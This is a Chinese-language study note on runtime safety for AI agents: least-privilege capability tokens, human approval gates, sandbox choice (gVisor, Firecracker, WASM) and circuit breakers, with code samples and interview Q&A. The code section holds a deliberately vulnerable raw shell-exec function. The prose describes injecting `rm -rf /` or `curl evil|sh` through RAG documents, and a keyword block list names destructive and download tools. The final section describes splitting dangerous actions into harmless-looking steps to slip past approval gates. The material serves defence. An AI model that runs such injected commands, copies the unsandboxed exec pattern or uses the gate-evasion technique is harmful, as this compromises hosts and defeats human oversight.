[[24 沙箱、最小权限与人审闸门|沙箱、最小权限与人审闸门]]是 Agent **运行时**防御的三件套:当 [[21 Guardrails 与输入输出防护|护栏]] 没拦住、模型还是想干危险动作时,这一层决定它**能做什么、该不该做、做坏了能波及多远**。它对应 [[23 Agent Harness 概览|Agent Harness]] 四职责中的 Safety——harness 正是承载这些控制的运行时骨架。

## 三件套各管一层
- **最小权限(least privilege)**:用 capability-based security,只授予本任务必需的能力;无 token 即无权,默认拒绝。收窄"能做什么"。
- **HITL 人审闸(approval gate)**:高危动作(删库、转账、部署、对外发消息)暂停,等人点同意才放行。把住"该不该做"。
- **沙箱(sandbox)**:在隔离环境里执行,限制爆炸半径(blast radius)。约束"做坏了能波及多远"。
- 外加 **熔断(circuit breaker)** 横跨全链兜底:异常率 / 速率 / 成本超阈时一键切断,防失控放大成现实损害(与 [[12 Unbounded Consumption 成本型 DoS|无界消耗]] 共用阈值面)。

这套机制专治 [[14 Excessive Agency 与 Goal Hijack|过度代理]]、[[15 Tool Misuse 与意外代码执行|工具滥用]]:即便 agent 被劫持着调 [[16 工具设计与工具层|工具]],三道闸也能在真实后果落地前止血。

## 沙箱选型(隔离强度梯度)
从弱到强:
- **容器(namespaces/cgroups)**:共享宿主内核,逃逸面最大,跑不可信代码最弱。
- **gVisor**(Google):用户态内核,核心 Sentry(Go 写)经 ptrace/KVM 拦截 syscall 再到宿主内核,缩小内核攻击面;开销中等,适合算力重、I/O 少的 agent。
- **Firecracker microVM**(AWS):KVM 硬件级隔离,每个 microVM 独立内核、硬件强制内存隔离,仅 5 个设备、约 5 万行 Rust,攻面极小;**跑不可信代码首选,隔离最强**。
- **WASM**:capability-based 沙箱 + 受保护内存,轻量但能力受限。

经验法则:让 agent 执行不可信代码 → Firecracker / Kata;算力重 I/O 少 → gVisor 够用且省全 VM 开销。

## 脆弱代码 vs 缓解代码
**脆弱:裸 exec,无隔离、无审批、无限权**
```python
def run_agent_action(cmd: str):
    # agent 生成什么就在宿主上跑什么 —— 提示注入 → RCE
    return subprocess.run(cmd, shell=True, capture_output=True)
```
攻击者把 `rm -rf / ` 或 `curl evil|sh` 注入进 RAG 文档,agent 照单全收,直接打穿宿主。

**缓解:最小权限 + 人审闸 + 沙箱 + 熔断**
```python
DANGEROUS = ("rm", "curl", "dd", "mkfs", "chmod", ":(){")

def run_agent_action(cmd: str, ctx) -> Result:
    # ① 最小权限:无对应 capability 直接拒
    if not ctx.caps.allows("shell.exec"):
        return Result.denied("no shell.exec capability")
    # ② 熔断:超速率/成本即停机
    if ctx.breaker.tripped():
        return Result.halted("circuit breaker open")
    # ③ 人审闸:命中高危关键词 → 暂停等人批准
    if any(t in cmd for t in DANGEROUS):
        if not ctx.approval.request(cmd):      # 阻塞,等人点同意
            return Result.denied("human rejected")
    # ④ 沙箱:在 microVM 内执行,网络默认关、文件系统只读挂载、超时强杀
    return ctx.sandbox.exec(            # Firecracker microVM
        cmd, network=False, rootfs="ro", timeout=30,
    )
```
四道闸串联:无权 → 拒;熔断 → 停;高危 → 等人审;放行也只在沙箱内跑,网络关、只读盘、超时杀。任一环兜住即止血。

## 何时用 / 坑
- **何时用**:任何能执行代码、调写操作工具、动真实资源的 agent,三件套是底线;能力越强、越自主,闸门要越严。
- **坑 1**:沙箱配松等于没有。开了网络、可写宿主盘、不限时,microVM 也救不了——隔离强度看**配置**不只看技术选型。
- **坑 2**:人审疲劳。审批弹太勤,人会无脑点同意(rubber-stamping);只对**真高危**动作设闸,常规动作靠权限+沙箱自动放行。
- **坑 3**:权限蠕变(privilege creep)。为图省事给 agent 发宽 token,违背最小权限;能力应按任务**临时、最小**授予。
- **坑 4**:无熔断。沙箱限单次,但失控 agent 高频重试照样烧钱/刷接口,必须有速率与成本熔断。

## 关键事实(含出处)
- gVisor:Google 开源,用户态内核 Sentry 拦 syscall,缩内核攻面。
- Firecracker:AWS 开源,KVM microVM,独立内核、硬件内存隔离,约 5 设备 + ~5 万行 Rust。
- capability-based security:按能力(而非身份)授权,默认拒绝,最小权限的实现范式。
- HITL approval gate / circuit breaker:agent 运行时危险动作人审与失控熔断的标准模式。

## 工业界实践
这三件套是生产 Agent 的运行时安全底座。下面给真实沙箱产品、权限模型、HITL 设计与熔断阈值的落地细节。

### 沙箱产品全景(隔离强度梯度)
| 方案 | 隔离机制 | 逃逸面 | 开销 | 跑不可信代码 |
|---|---|---|---|---|
| 裸容器(Docker) | namespaces/cgroups,共享内核 | 大 | 低 | 不推荐 |
| **gVisor**(Google) | 用户态内核 Sentry 拦 syscall | 中 | 中 | 可,算力重 I/O 少首选 |
| **Kata Containers** | 轻量 VM,容器接口 | 小 | 中高 | 可 |
| **Firecracker microVM**(AWS) | KVM 硬件隔离,独立内核 | 极小(~5 设备,~5 万行 Rust) | 中 | **跑不可信代码首选** |
| **WASM**(Wasmtime 等) | capability 沙箱 + 受保护内存 | 小 | 极低 | 能力受限场景 |
| 托管代码执行(E2B / Daytona / 各云 Code Interpreter) | 多基于 Firecracker/gVisor | 小 | 托管 | 开箱即用 |

经验:**让 agent 执行不可信代码 → Firecracker/Kata 或托管沙箱(E2B 等);算力重 I/O 少 → gVisor**。OpenAI Code Interpreter、Anthropic 的代码执行、各 Agent 平台底层多是 gVisor/Firecracker。

### 权限模型:capability-based + 短时令牌
```python
# 反例:给 agent 一个长期、宽范围的 API key —— 权限蠕变
agent = Agent(api_key=GOD_KEY)  # 能读写一切,泄露即灾难

# 正例:按任务签发最小、临时、可撤销的 capability token
caps = mint_capability(
    scopes=["calendar.read", "email.send:to=teammates"],  # 只授本任务必需
    ttl=300,            # 5 分钟即过期(短时令牌)
    audience=task_id,   # 绑定到具体任务,不可复用
)
```
最小权限的工程化:默认拒绝(deny-by-default)、按任务临时授权、TTL 短、scope 细、可即时撤销(IR 遏制时一键吊销,见 [[25 监控、可观测与事件响应|监控与 IR]])。

### HITL 闸门设计(防"人审疲劳")
- **只对真高危设闸**:删库、转账、部署、对外发消息、不可逆操作;常规读操作靠权限+沙箱自动放行。审批弹太勤 → 人无脑点同意(rubber-stamping),等于没有。
- **给人足够上下文**:展示"agent 要做什么、为什么、影响面、回滚代价",而非只弹一个"同意/拒绝"。
- **超时默认拒**:人没在 N 分钟内批准 → fail-closed 拒绝,不挂起占资源。
- **分级审批**:中危单人批、高危双人批(four-eyes)、极高危走变更流程。

### 熔断阈值(circuit breaker)
横跨全链兜底,与 [[12 Unbounded Consumption 成本型 DoS|无界消耗]]共用阈值面:
```python
breaker.trip_if(
    error_rate > 0.3,        # 异常率突增 → 可能被劫持/失控
    calls_per_min > 100,     # 速率超限 → 重试风暴/刷接口
    cost_usd > budget,       # 成本超预算 → 烧钱型 DoS
    same_action_repeat > 10, # 同动作高频重复 → 死循环/goal-drift
)  # 命中即一键切断,人工复位前不放行
```

## 面试高频
**Q1:Agent 运行时安全为什么需要"三件套",各管什么?**
标准答:最小权限收窄"**能做什么**"(无 token 即无权,默认拒绝);HITL 闸门把住"**该不该做**"(高危动作暂停等人批);沙箱约束"**做坏了波及多远**"(限制爆炸半径)。外加熔断横跨全链兜底(异常/速率/成本超阈一键切断)。它们专治[[14 Excessive Agency 与 Goal Hijack|过度代理]]和[[15 Tool Misuse 与意外代码执行|工具滥用]]——即便 agent 被劫持,后果落地前还有三道闸止血。

**Q2:容器、gVisor、Firecracker 隔离强度怎么排?跑不可信代码选哪个?**
标准答:容器(共享内核,逃逸面最大)< gVisor(用户态内核拦 syscall,缩内核攻面)< Firecracker microVM(KVM 硬件隔离,独立内核,~5 万行 Rust 攻面极小)。**跑不可信代码首选 Firecracker/Kata**;算力重 I/O 少时 gVisor 够用且省全 VM 开销。
- 陷阱追问:"用了 microVM 是不是就绝对安全?"→ 不是。**隔离强度看配置**——开了网络、可写宿主盘、不限时,microVM 也救不了。

**Q3(陷阱):人审闸门是不是设得越多越安全?**
标准答:不是。审批弹太勤会导致**人审疲劳**,人会无脑点同意(rubber-stamping),反而形同虚设。正确做法是**只对真高危动作设闸**、给人足够上下文、超时默认拒、分级审批;常规动作靠最小权限+沙箱自动放行。

**Q4:什么是权限蠕变(privilege creep)?怎么防?**
标准答:为图省事给 agent 发宽范围、长期 token,逐渐积累过多权限,违背最小权限。防法:capability-based 授权(按能力不按身份)、默认拒绝、按任务临时授予、短 TTL、scope 细化、可即时撤销。

**Q5:有了沙箱为什么还要熔断?**
标准答:沙箱限制的是**单次**动作的爆炸半径,但失控 agent 高频**重试**照样烧钱/刷接口/打穿配额(成本型 DoS)。熔断在异常率/速率/成本/重复动作超阈时一键切断整条链,补上沙箱管不到的"放大失控"维度。

## 知识拓展
- **沙箱技术谱系**:chroot → 容器(namespaces/cgroups)→ gVisor(用户态内核,2018)→ Firecracker(AWS Lambda/Fargate 底座,2018 开源)→ WASM/WASI(capability 模型,轻量)。Agent 时代催生了 E2B、Daytona 等"Agent 代码执行托管沙箱"。
- **capability security**:思想源自 1970s capability-based 操作系统,现代复兴于 WASI、Fuchsia;核心是"授予不可伪造的能力凭证而非检查身份",天然契合最小权限。
- **HITL 模式**:从简单 approval gate 演进到 "human-on-the-loop"(人监督而非逐步批)、"break-glass"(平时全自动,异常时强制人审)等分级模式;LangGraph、AutoGen 等框架内置 interrupt/approval 节点。
- **对抗演化**:攻击者会设法**绕过闸门**——把高危动作拆成多个"看似无害"的小动作避开关键词闸(对应 [[14 Excessive Agency 与 Goal Hijack|目标劫持]]渐进式)、用合法工具组合出危险效果([[15 Tool Misuse 与意外代码执行|工具滥用]])。所以闸门要看**语义意图与动作链**,不只匹配关键词。
